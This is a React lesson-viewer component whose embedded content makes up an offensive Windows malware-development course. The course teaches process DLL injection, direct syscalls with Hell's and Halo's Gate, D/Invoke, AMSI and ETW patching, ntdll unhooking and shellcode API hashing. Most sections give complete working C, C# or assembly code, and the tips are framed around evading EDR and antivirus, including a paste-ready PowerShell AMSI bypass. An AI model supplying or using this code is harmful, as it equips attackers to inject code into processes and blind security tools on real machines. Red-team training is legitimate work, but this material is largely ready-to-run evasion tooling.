import { Card } from "@/components/ui/card";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { ChevronRight, BookOpen } from "lucide-react";

interface LessonViewerProps {
  moduleId: string;
}

const lessonContent: Record<string, any> = {
  "windows-internals": {
    title: "Windows Process Architecture",
    sections: [
      {
        title: "Understanding Process Memory Layout",
        content: `Every Windows process operates in its own virtual address space. Understanding this layout is crucial for advanced operations:

**Memory Regions:**
- 0x00000000 - 0x7FFFFFFF: User-mode space
- 0x80000000 - 0xFFFFFFFF: Kernel-mode space (NT kernel)

**Key Structures:**
- PEB (Process Environment Block)
- TEB (Thread Environment Block)
- VAD (Virtual Address Descriptor) Tree`,
        code: `// Accessing PEB in C
#include <windows.h>
#include <winternl.h>

PPEB GetPEB() {
    return (PPEB)__readgsqword(0x60); // x64
    // return (PPEB)__readfsdword(0x30); // x86
}

// Example: Get ImageBaseAddress
PVOID GetImageBase() {
    PPEB peb = GetPEB();
    return peb->ImageBaseAddress;
}`,
        note: "The PEB contains critical process information including loaded modules, command line, and environment variables."
      },
      {
        title: "Win32 API vs Native API",
        content: `Win32 API functions (kernel32.dll) are wrappers around Native API (ntdll.dll) functions:

**Win32 → Native API mapping:**
- CreateFile → NtCreateFile
- VirtualAlloc → NtAllocateVirtualMemory
- CreateThread → NtCreateThreadEx

**Why use Native API?**
1. Bypass usermode hooks (EDR/AV monitoring)
2. More granular control
3. Features not exposed in Win32`,
        code: `// Direct Native API call
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

PVOID AllocateMemoryNative(SIZE_T size) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = 
        (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    
    PVOID baseAddr = NULL;
    SIZE_T regionSize = size;
    
    NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &baseAddr,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    return baseAddr;
}`,
        note: "Native API calls require understanding NTSTATUS return codes and more complex parameter structures."
      }
    ]
  },
  "process-injection": {
    title: "Classic DLL Injection",
    sections: [
      {
        title: "DLL Injection Overview",
        content: `DLL injection is a fundamental technique for executing code in another process. The classic method uses:

**Steps:**
1. OpenProcess - Get handle to target
2. VirtualAllocEx - Allocate memory in target
3. WriteProcessMemory - Write DLL path
4. CreateRemoteThread - Execute LoadLibrary`,
        code: `#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD processId, const char* dllPath) {
    // 1. Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        processId
    );
    
    if (!hProcess) {
        printf("Failed to open process: %d\\n", GetLastError());
        return FALSE;
    }
    
    // 2. Allocate memory for DLL path
    SIZE_T pathSize = strlen(dllPath) + 1;
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        pathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!remoteBuffer) {
        printf("VirtualAllocEx failed\\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 3. Write DLL path to remote process
    if (!WriteProcessMemory(hProcess, remoteBuffer, 
        dllPath, pathSize, NULL)) {
        printf("WriteProcessMemory failed\\n");
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 4. Get address of LoadLibraryA
    LPVOID loadLibraryAddr = GetProcAddress(
        GetModuleHandleA("kernel32.dll"),
        "LoadLibraryA"
    );
    
    // 5. Create remote thread to load DLL
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)loadLibraryAddr,
        remoteBuffer,
        0,
        NULL
    );
    
    if (!hThread) {
        printf("CreateRemoteThread failed\\n");
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    
    // Cleanup
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    printf("DLL injected successfully!\\n");
    return TRUE;
}`,
        note: "This technique is well-known and monitored by EDR. Modern variations use techniques like module overwriting or manual mapping."
      }
    ]
  },
  "syscalls": {
    title: "Direct System Calls",
    sections: [
      {
        title: "Understanding System Service Numbers (SSN)",
        content: `Every Windows API call eventually becomes a syscall. The SSN identifies which kernel function to execute.

**How it works:**
1. Usermode calls NtXxx function in ntdll.dll
2. Function contains: mov eax, SSN; syscall
3. CPU switches to kernel mode
4. KiSystemCall64 dispatches to kernel function

**Why direct syscalls?**
EDRs hook ntdll.dll functions. By making syscalls directly, we bypass these hooks.`,
        code: `// Assembly stub for NtAllocateVirtualMemory
// SSN for Windows 10/11 x64

extern "C" NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID * BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

__asm__(
    "SysNtAllocateVirtualMemory: \\n"
    "mov r10, rcx \\n"              // Save first parameter
    "mov eax, 0x18 \\n"             // SSN for NtAllocateVirtualMemory (Win10/11)
    "syscall \\n"                   // Make the syscall
    "ret \\n"
);

// Usage:
PVOID AllocWithSyscall() {
    PVOID baseAddr = NULL;
    SIZE_T size = 0x1000;
    
    NTSTATUS status = SysNtAllocateVirtualMemory(
        GetCurrentProcess(),
        &baseAddr,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (status == 0) {
        return baseAddr;
    }
    return NULL;
}`,
        note: "SSNs change between Windows versions! Use dynamic SSN resolution techniques like Hell's Gate."
      },
      {
        title: "Hell's Gate: Dynamic SSN Resolution",
        content: `Hell's Gate dynamically resolves SSNs by reading them from ntdll.dll at runtime.

**Technique:**
1. Find ntdll.dll in memory
2. Locate the target function (e.g., NtAllocateVirtualMemory)
3. Read the SSN from the function's first bytes
4. Use the SSN for direct syscall`,
        code: `#include <windows.h>

// Check if bytes are a syscall stub
BOOL IsSyscallStub(BYTE* addr) {
    // Pattern: 4C 8B D1 B8 [SSN] 00 00
    return (addr[0] == 0x4C && 
            addr[1] == 0x8B && 
            addr[2] == 0xD1 && 
            addr[3] == 0xB8);
}

WORD GetSSN(const char* funcName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE* funcAddr = (BYTE*)GetProcAddress(ntdll, funcName);
    
    if (!funcAddr) return 0;
    
    // Check if function is hooked
    if (IsSyscallStub(funcAddr)) {
        // Extract SSN from bytes 4-5
        return *(WORD*)(funcAddr + 4);
    }
    
    // If hooked, search nearby functions (Halo's Gate)
    for (int i = 1; i <= 32; i++) {
        // Check forward
        BYTE* up = funcAddr + (i * 32);
        if (IsSyscallStub(up)) {
            WORD ssn = *(WORD*)(up + 4);
            return ssn - i; // Calculate target SSN
        }
        
        // Check backward
        BYTE* down = funcAddr - (i * 32);
        if (IsSyscallStub(down)) {
            WORD ssn = *(WORD*)(down + 4);
            return ssn + i;
        }
    }
    
    return 0;
}

// Example usage:
void ExampleSyscall() {
    WORD ssn = GetSSN("NtAllocateVirtualMemory");
    printf("SSN: 0x%X\\n", ssn);
    
    // Now use this SSN in your assembly stub
}`,
        note: "Halo's Gate extends Hell's Gate by handling hooked functions - it searches nearby syscall stubs to calculate the correct SSN."
      }
    ]
  },
  "pinvoke": {
    title: "P/Invoke & D/Invoke in C#",
    sections: [
      {
        title: "Platform Invoke (P/Invoke)",
        content: `P/Invoke allows C# to call unmanaged Win32 APIs from managed code.

**Key Concepts:**
- DllImport attribute
- Marshalling data types
- Structure layouts
- Function pointers via delegates`,
        code: `using System;
using System.Runtime.InteropServices;

class NativeInterop {
    // Import Win32 API
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );
    
    // Structure marshalling
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    
    // Constants
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    
    static void AllocateMemory() {
        IntPtr mem = VirtualAlloc(
            IntPtr.Zero,
            0x1000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        
        if (mem != IntPtr.Zero) {
            Console.WriteLine($"Allocated at: 0x{mem.ToInt64():X}");
        }
    }
}`,
        note: "P/Invoke declarations are monitored. D/Invoke resolves functions dynamically at runtime."
      },
      {
        title: "Dynamic Invoke (D/Invoke)",
        content: `D/Invoke manually resolves and calls Win32 APIs at runtime, avoiding static P/Invoke declarations that EDRs scan for.

**Technique:**
1. GetModuleHandle to find DLL
2. GetProcAddress to resolve function
3. Marshal delegate to call function`,
        code: `using System;
using System.Runtime.InteropServices;

class DInvoke {
    // Delegate matching VirtualAlloc signature
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    static IntPtr DynamicVirtualAlloc(uint size) {
        // 1. Get handle to kernel32
        IntPtr kernel32 = GetModuleHandle("kernel32.dll");
        
        // 2. Resolve VirtualAlloc
        IntPtr pVirtualAlloc = GetProcAddress(kernel32, "VirtualAlloc");
        
        // 3. Marshal to delegate
        VirtualAllocDelegate VirtualAlloc = 
            Marshal.GetDelegateForFunctionPointer<VirtualAllocDelegate>(pVirtualAlloc);
        
        // 4. Call it
        return VirtualAlloc(
            IntPtr.Zero,
            size,
            0x1000 | 0x2000, // MEM_COMMIT | MEM_RESERVE
            0x40             // PAGE_EXECUTE_READWRITE
        );
    }
    
    // Even better: resolve from NTDLL
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate uint NtAllocateVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref uint RegionSize,
        uint AllocationType,
        uint Protect
    );
    
    static IntPtr NativeAlloc(uint size) {
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr pNtAllocate = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
        
        NtAllocateVirtualMemoryDelegate NtAllocateVirtualMemory = 
            Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemoryDelegate>(pNtAllocate);
        
        IntPtr baseAddr = IntPtr.Zero;
        uint regionSize = size;
        
        uint status = NtAllocateVirtualMemory(
            (IntPtr)(-1), // Current process
            ref baseAddr,
            IntPtr.Zero,
            ref regionSize,
            0x1000 | 0x2000,
            0x40
        );
        
        return status == 0 ? baseAddr : IntPtr.Zero;
    }
}`,
        note: "D/Invoke + Native API calls = powerful evasion. Combine with syscalls for maximum stealth."
      }
    ]
  },
  "evasion": {
    title: "AV/EDR Evasion Techniques",
    sections: [
      {
        title: "AMSI Bypass",
        content: `AMSI (Antimalware Scan Interface) scans script content and .NET assemblies. Bypassing it is essential for running offensive tools.

**Common Techniques:**
1. Memory patching amsi.dll
2. Forcing AMSI initialization failure
3. Reflection-based bypass`,
        code: `// Classic AMSI patch (C)
#include <windows.h>

BOOL PatchAMSI() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return FALSE;
    
    FARPROC AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!AmsiScanBuffer) return FALSE;
    
    // Patch to return AMSI_RESULT_CLEAN
    unsigned char patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057 (E_INVALIDARG)
        0xC3                            // ret
    };
    
    DWORD oldProtect;
    if (!VirtualProtect(AmsiScanBuffer, sizeof(patch), 
        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }
    
    memcpy(AmsiScanBuffer, patch, sizeof(patch));
    
    VirtualProtect(AmsiScanBuffer, sizeof(patch), 
        oldProtect, &oldProtect);
    
    return TRUE;
}

// PowerShell AMSI bypass (paste in PS):
/*
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
*/`,
        note: "Modern EDRs detect these patterns. Use obfuscation, indirect calls, or hardware breakpoint techniques."
      },
      {
        title: "ETW Patching",
        content: `ETW (Event Tracing for Windows) logs API calls that EDRs monitor. Patching it blinds defensive tools.

**Target:** EtwEventWrite in ntdll.dll`,
        code: `#include <windows.h>

BOOL PatchETW() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;
    
    FARPROC EtwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    if (!EtwEventWrite) return FALSE;
    
    // Patch with 'ret' instruction
    unsigned char patch[] = { 0xC3 }; // ret
    
    DWORD oldProtect;
    if (!VirtualProtect(EtwEventWrite, sizeof(patch), 
        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }
    
    memcpy(EtwEventWrite, patch, sizeof(patch));
    
    VirtualProtect(EtwEventWrite, sizeof(patch), 
        oldProtect, &oldProtect);
    
    return TRUE;
}

// C# version using D/Invoke
/*
IntPtr ntdll = GetModuleHandle("ntdll.dll");
IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");

byte[] patch = { 0xC3 };
Marshal.Copy(patch, 0, etwAddr, 1);
*/`,
        note: "Combine with thread suspension during patching to avoid race conditions with EDR checks."
      },
      {
        title: "API Unhooking",
        content: `EDRs hook API functions by modifying their first bytes (inline hooks). Unhooking restores original bytes from disk.

**Steps:**
1. Read clean ntdll.dll from disk
2. Compare with hooked version in memory
3. Restore original bytes`,
        code: `#include <windows.h>
#include <stdio.h>

BOOL UnhookNTDLL() {
    // 1. Get ntdll.dll base address in memory
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    // 2. Get path to ntdll.dll on disk
    char ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    strcat_s(ntdllPath, "\\\\ntdll.dll");
    
    // 3. Read clean ntdll from disk
    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, 
        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID cleanNtdll = VirtualAlloc(NULL, fileSize, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    ReadFile(hFile, cleanNtdll, fileSize, NULL, NULL);
    CloseHandle(hFile);
    
    // 4. Parse PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)cleanNtdll + dosHeader->e_lfanew);
    
    // 5. Find .text section
    PIMAGE_SECTION_HEADER textSection = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)textSection->Name, ".text") == 0) {
            // 6. Get addresses
            LPVOID hookedText = (BYTE*)hNtdll + textSection->VirtualAddress;
            LPVOID cleanText = (BYTE*)cleanNtdll + textSection->PointerToRawData;
            SIZE_T textSize = textSection->Misc.VirtualSize;
            
            // 7. Change protection
            DWORD oldProtect;
            VirtualProtect(hookedText, textSize, 
                PAGE_EXECUTE_READWRITE, &oldProtect);
            
            // 8. Copy clean bytes
            memcpy(hookedText, cleanText, textSize);
            
            // 9. Restore protection
            VirtualProtect(hookedText, textSize, 
                oldProtect, &oldProtect);
            
            VirtualFree(cleanNtdll, 0, MEM_RELEASE);
            return TRUE;
        }
        textSection++;
    }
    
    VirtualFree(cleanNtdll, 0, MEM_RELEASE);
    return FALSE;
}`,
        note: "Advanced EDRs use kernel callbacks to detect unhooking. Consider using syscalls instead."
      }
    ]
  },
  "shellcode": {
    title: "Position Independent Code (PIC)",
    sections: [
      {
        title: "Understanding PIC Requirements",
        content: `Shellcode must be position-independent because you can't predict where it will load in memory.

**Requirements:**
1. No hardcoded addresses
2. Resolve APIs dynamically
3. No reliance on imports
4. Self-contained data`,
        code: `; x64 Assembly - Basic PIC template
; NASM syntax

BITS 64

section .text
global start

start:
    ; Standard function prologue
    push rbp
    mov rbp, rsp
    sub rsp, 0x20           ; Shadow space for x64 calls
    
    ; Get PEB (Process Environment Block)
    mov rax, [gs:0x60]      ; PEB is at gs:0x60 on x64
    
    ; Get Ldr (PEB_LDR_DATA)
    mov rax, [rax + 0x18]   ; PEB->Ldr
    
    ; Get first module in load order (usually ntdll.dll)
    mov rax, [rax + 0x20]   ; Ldr->InLoadOrderModuleList
    mov rax, [rax]          ; First entry
    mov rax, [rax]          ; Second entry (kernel32.dll)
    
    ; Get DllBase
    mov rdi, [rax + 0x20]   ; LDR_DATA_TABLE_ENTRY->DllBase
    
    ; Now rdi contains kernel32.dll base
    ; Parse PE to find exports...
    
    ; Function epilogue
    add rsp, 0x20
    pop rbp
    ret`,
        note: "This is the foundation. Next step: parse PE exports to find functions like GetProcAddress."
      },
      {
        title: "Finding Functions via PEB Walking",
        content: `The PEB contains the loaded module list. We walk it to find kernel32.dll, then parse its exports.

**Process:**
1. PEB → Ldr → InLoadOrderModuleList
2. Iterate modules, hash names
3. Find target DLL (e.g., kernel32)
4. Parse PE exports
5. Hash function names to find target`,
        code: `; Function to find API by hash
; Input: rcx = module base, rdx = function hash
; Output: rax = function address

find_function:
    push rbp
    mov rbp, rsp
    push rbx
    push rsi
    push rdi
    
    mov rdi, rcx            ; Save module base
    
    ; Parse PE headers
    mov eax, [rdi + 0x3C]   ; e_lfanew offset
    add rax, rdi            ; NT headers
    
    ; Get export directory RVA
    mov eax, [rax + 0x88]   ; Export table RVA (x64)
    add rax, rdi            ; Export table VA
    
    ; Get export arrays
    mov ecx, [rax + 0x18]   ; NumberOfNames
    mov ebx, [rax + 0x20]   ; AddressOfNames RVA
    add rbx, rdi            ; AddressOfNames VA
    
find_loop:
    dec ecx
    mov esi, [rbx + rcx*4]  ; Get name RVA
    add rsi, rdi            ; Name VA
    
    ; Hash the name
    call hash_string
    cmp eax, edx            ; Compare with target hash
    jne find_loop
    
    ; Found! Get function address
    mov ebx, [rax + 0x24]   ; AddressOfNameOrdinals RVA
    add rbx, rdi
    movzx ecx, word [rbx + rcx*2]  ; Ordinal
    
    mov ebx, [rax + 0x1C]   ; AddressOfFunctions RVA
    add rbx, rdi
    mov eax, [rbx + rcx*4]  ; Function RVA
    add rax, rdi            ; Function VA
    
    pop rdi
    pop rsi
    pop rbx
    pop rbp
    ret

; Simple hash function (djb2)
hash_string:
    xor eax, eax
    mov ecx, 5381
hash_loop:
    lodsb                   ; Load byte from RSI
    test al, al
    jz hash_done
    xor eax, ecx
    imul ecx, 33
    jmp hash_loop
hash_done:
    mov eax, ecx
    ret`,
        note: "Use custom hash algorithms to avoid signature detection. Rotate, XOR with keys, etc."
      }
    ]
  }
};

const LessonViewer = ({ moduleId }: LessonViewerProps) => {
  const lesson = lessonContent[moduleId] || lessonContent["windows-internals"];

  return (
    <Card className="p-0 bg-card border-border overflow-hidden">
      <div className="bg-secondary p-4 border-b border-border">
        <div className="flex items-center gap-2">
          <BookOpen className="h-5 w-5 text-primary" />
          <h3 className="font-bold text-foreground">{lesson.title}</h3>
        </div>
      </div>
      
      <ScrollArea className="h-[600px]">
        <div className="p-6 space-y-8">
          {lesson.sections.map((section: any, idx: number) => (
            <div key={idx} className="space-y-4">
              <div className="flex items-center gap-2">
                <Badge variant="outline" className="text-xs">
                  Section {idx + 1}
                </Badge>
                <h4 className="font-semibold text-lg text-foreground">{section.title}</h4>
              </div>
              
              <div className="prose prose-invert max-w-none">
                <p className="text-sm text-muted-foreground whitespace-pre-line leading-relaxed">
                  {section.content}
                </p>
              </div>
              
              {section.code && (
                <div className="bg-code-bg rounded-lg p-4 border border-border">
                  <pre className="text-xs text-primary overflow-x-auto">
                    <code>{section.code}</code>
                  </pre>
                </div>
              )}
              
              {section.note && (
                <div className="bg-accent/10 border-l-4 border-accent p-4 rounded">
                  <p className="text-xs text-foreground font-medium">
                    💡 {section.note}
                  </p>
                </div>
              )}
            </div>
          ))}
          
          <Button className="w-full" variant="outline">
            <ChevronRight className="mr-2 h-4 w-4" />
            Next Lesson
          </Button>
        </div>
      </ScrollArea>
    </Card>
  );
};

export default LessonViewer;
